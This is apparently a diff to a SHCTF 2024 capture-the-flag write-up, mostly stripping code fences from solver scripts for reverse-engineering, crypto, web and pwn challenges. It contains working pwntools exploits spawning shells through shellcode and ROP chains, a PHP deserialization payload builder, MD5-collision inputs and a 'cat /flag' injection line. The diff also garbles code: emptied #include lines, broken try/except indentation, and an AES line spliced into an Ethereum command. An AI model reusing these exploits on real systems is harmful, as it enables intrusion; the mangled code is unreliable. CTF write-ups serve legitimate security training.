@@ -452,7 +452,7 @@ print("Flag:", ''.join(dec_text))
 
 [Week1]ezxor
 
-#include<iostream>
+#include
 #include<stdlib.h>
 using namespace std;
 int main(){
@@ -481,7 +481,7 @@ int main(){
 //#include <stdio.h>
 #include <stdlib.h>
 #include<string.h>
-#include<iostream>
+#include
 using namespace std;
 unsigned char S[256];
 void swap(unsigned char *a, unsigned char *b) {
@@ -558,23 +558,8 @@ for i in range(5):
     z = np.zeros_like(img)  
     z[:, i::5] = img[:, i::5]  
     Image.fromarray(z).show()
-```
-
-
-
-```
 cat ./* > output
-```
-
-
-
-```
 aircrack-ng file -w output
-```
-
-
-
-```
 <?php
 class SH {
 
@@ -627,11 +612,6 @@ $a->n=new F();
 $a->n->o=new C();
 $a->n->o->p=new SHCTF();
 echo base64_encode(serialize($a));
-```
-
-
-
-```
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 
@@ -650,11 +630,6 @@ class demo{
         }
     }
 }
-```
-
-
-
-```
 import os
 import flask
 from flask import Flask, request, send_from_directory, send_file
@@ -678,11 +653,6 @@ def get_source():
  
 if __name__ == '__main__':
     app.run(debug=True)
-```
-
-
-
-```
 <?php
 $md51=file_get_contents('./md5_msg1.txt');
 $md52=file_get_contents('./md5_msg2.txt');
@@ -693,23 +663,8 @@ if($md51 !== $md52 && md5($md51)===md5($md52)){
     echo "&";
     echo "master2=".urlencode(substr($md52,strlen($master)));
 }
-```
-
-
-
-```
 master1=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%11%A2%C0gYM%90iF%B4%05K%F6h%E7%B3%88%0DKc%1Dq%9F%870F%7B%D1%E3%85%28%CD%3A%E3%0E%C4J%ADJ%A2%EB%E7%BB%5C%02%C6%90cg%40%84_8%D5M%AE%CC%88%B6%86Y_%14%29P%1Dd%7B%23%DE%BD%F2%F0%92%FB%82%E1%27%99%95%D1%8F%E1%A8%83%7C%C4%ED%04%89%21xN%EA%09%AF%CDw%F6%A2%60R%E4%88%EA4%F9Y%89%ACJ%7F%14%F9%28%03O%C3%A3%BE%DA%DFW%7E%E6%B0%94%3B&master2=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%11%A2%C0gYM%90iF%B4%05K%F6h%E7%B3%88%0DK%E3%1Dq%9F%870F%7B%D1%E3%85%28%CD%3A%E3%0E%C4J%ADJ%A2%EB%E7%BB%5C%02F%91cg%40%84_8%D5M%AE%CC%88%B6%06Y_%14%29P%1Dd%7B%23%DE%BD%F2%F0%92%FB%82%E1%27%99%95%D1%8F%E1%28%83%7C%C4%ED%04%89%21xN%EA%09%AF%CDw%F6%A2%60R%E4%88%EA4%F9Y%89%2CJ%7F%14%F9%28%03O%C3%A3%BE%DA%DFW%FE%E6%B0%94%3B
-```
-
-
-
-```
 cat /flag >$2
-```
-
-
-
-```
 from pwn import *
 context(arch='amd64', os='linux', log_level='debug')
 p = process('./pwn')
@@ -717,11 +672,6 @@ payload = asm(shellcraft.sh())[:-2].ljust(0x100, asm('nop'))
 p.sendlineafter(b':', str(0x50f))
 p.sendafter(b':', payload)
 p.interactive()
-```
-
-
-
-```
 from pwn import *
 # from LibcSearcher import *
 import itertools
@@ -759,11 +709,6 @@ payload = b'x00' * 0x118 + p64(backdoor)
 sa(">>>",payload)
 
 p.interactive()
-```
-
-
-
-```
 from pwn import *
 # from LibcSearcher import *
 import itertools
@@ -816,11 +761,6 @@ payload = b'a' * 0x108 + p64(pop_rdi_ret) + p64(binsh) + p64(ret) + 
 sa("input",payload)
 
 p.interactive()
-```
-
-
-
-```
 from pwn import *
 # from LibcSearcher import *
 import itertools
@@ -873,11 +813,6 @@ time.sleep(0.3)
 s(b'/bin/shx00')
 
 p.interactive()
-```
-
-
-
-```
 import base64
 
 key = [12, 15, 25, 30, 36]
@@ -905,13 +840,8 @@ for i in range(len(decoded_text)):
 
 print("Flag:", ''.join(dec_text))
 # Flag: 7Ush87-akjxcy2Ju-dwia9;JSO-IQixnsm
-```
-
-
-
-```
-#include<iostream>
-#include<stdlib.h>
+    #include
+    #include<stdlib.h>
 using namespace std;
 int main(){
         char data[]={-61,105,114,-60,103,74,-24,17,67,-49,111,0,-13,68,110,-8,89,73,-24,78,94,-30,83,67,-79,92};
@@ -933,15 +863,10 @@ int main(){
         }
 }
 #SHCTF{x0r_N1ce_hxxxoorrr!}
-```
-
-
-
-```
 //#include <stdio.h>
-#include <stdlib.h>
-#include<string.h>
-#include<iostream>
+    #include <stdlib.h>
+    #include<string.h>
+    #include
 using namespace std;
 unsigned char S[256];
 void swap(unsigned char *a, unsigned char *b) {
@@ -980,11 +905,6 @@ int main(){
         cout<<out;        
 }
 #SHCTF{rc4_nice_ez!!!}
-```
-
-
-
-```
 from Crypto.Util.number import *
 import itertools
 import gmpy2
@@ -1014,13 +934,9 @@ for i in p_list:
         if b'SHCTF' in flag:
             print(flag)
             break
-    except:
+    
+except:
         pass
-```
-
-
-
-```
 from Crypto.Util.number import *
 import gmpy2
 from tqdm import *
@@ -1040,105 +956,15 @@ for tmp in trange(2**14,2**15-1):
             if b'SHCTF' in flag:
                 print(flag)
                 break
-        except:
+        
+except:
             pass
-```
-
-
-
-```
 from Crypto.Util.number import *
 from Crypto.Cipher import AES
 import os
-c = b'[x1bx0cxdbx9dxc0xe4Wxe1xddixd8.xbaW-x80xe1xc4Lx9exc3Lx9ex0bxadvx94-=xa2xf4x98xf9xa2xfdxbcxc5xc9xf7xd4x88V:xfexedxf6+'
-iv = b'M<Ix18xf4xcaxb42xd1xf2:`cx1ctx9d'
-key = b'Jlexabx9cxd8}x85xc4xf1/tx02xdaz_'
-my_aes = AES.new(key, AES.MODE_CBC, iv)
-m = my_aes.decrypt(c)
-print(m)
-#SHCTF{a66b6526-ae7f-4538-8d68-cef4e71e6afd}
-```
-
-
-
-```
-from Crypto.Util.number import *
-import gmpy2
-import sympy
-from tqdm import*
-c = 7619231789171995079294161234878423224231112429961838535540784984692964815324726959511719538222968332975752824731741518178086141907611550871403019016043596256109736194533826456432379700265157548262751707387902955474794955342745211189261217839388458558541610855570638979485715875458613584721374740387313646656453429749782646888147442107673006666786913122872882361836572072790817898782976016388830432654146591375959261230147062213668563221742359906177903255156356636148427480411387914934792027752124681828051885054176487796901097076771710538908474521518771489253933284065313644010703407250057718304709566471764216008833
-d = 4294890607908962616910170813936418137933989254123469803555687713508290441430349302109331416858412706457372735008848759911973894659751982291314717306592060486109717936934227859107527548007636110978177943504153504830427399670018088103145473328301738295079451783784918523654258608563796681268583347612365317742686170548984200881695503824129779720121644547769626667999547773210219170161559351337037056795720068516329254135806201887544486689070012222188533868735009912244250883223795602440999145676619713422671945150578230992434086632731164719925391045521061782211037385447361025091612158568846980146769425987904420426593
-e = 65537
-kphi = e*d-1
-for i in trange(2**13,2**17):
-    if kphi%i == 0:
-        phi = kphi//i
-        temp = gmpy2.iroot(phi,2)[0]
-        p = gmpy2.next_prime(temp)
-        q = sympy.prevprime(temp)
-        if d == inverse(e,(p-1)*(q-1)):
-            m = pow(c,d,p*q)
-            print(long_to_bytes(m))
-#SHCTF{8d4d7826-0a81-4914-98db-9574d3bcf620}
-```
-
-
-
-```
-from Crypto.Util.number import long_to_bytes
-import libnum
-
-m = 45539805380440641872365156183094421676774006568277726863510027015198537050186948229611640574904985469
-
-print(long_to_bytes(m))
-print(libnum.n2s(m))
-print(bytes.fromhex(hex(m)[2:]))
-```
-
-
-
-```
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
-
-contract WelcomeSHCTF2024 {
-
- string private storedFlag;
-
- constructor(string memory flag) {
- string memory xorResult = xorWithSHCTF(flag);
- storedFlag = xorResult;
- }
-
- function xorWithSHCTF(string memory flag) internal pure returns (string memory) {
- bytes memory flagBytes = bytes(flag);
- bytes memory xorKey = bytes("shctf");
- bytes memory result = new bytes(flagBytes.length);
-
- for (uint256 i = 0; i < flagBytes.length; i++) {
- result[i] = bytes1(uint8(flagBytes[i]) ^ uint8(xorKey[i % xorKey.length]));
- }
-
- return string(result);
- }
-
- function verifyXORedFlag(string memory inputFlag) public view returns (bool) {
- return keccak256(abi.encodePacked(storedFlag)) == keccak256(abi.encodePacked(xorWithSHCTF(inputFlag)));
- }
-}
-```
-
-
-
-```
-eth.getStorageAt("0x3948df4c50b1671eaa6b22876ea746899a6916c1")
-"0x000000000000000000000000000000000000000000000000000000000000004d"
-```
-
-
-
-```
-> eth.getStorageAt("0x3948DF4C50B1671eaa6b22876Ea746899a6916C1",0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563)
+c = b'[x1bx0cxdbx9dxc0xe4Wxe1xddixd8.xbaW-x80xe1xc4Lx9exc3Lx9ex0bxadvx94-=xa2xf4x98xf9xa2xfdxbcxc5xc9xf7xd4x88V:
+xfexedxf6+'
+iv = b'M eth.getStorageAt("0x3948DF4C50B1671eaa6b22876Ea746899a6916C1",0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563)
 "0x0000000000000000000000000000000000000000000000000000000000000000"
 ```
 
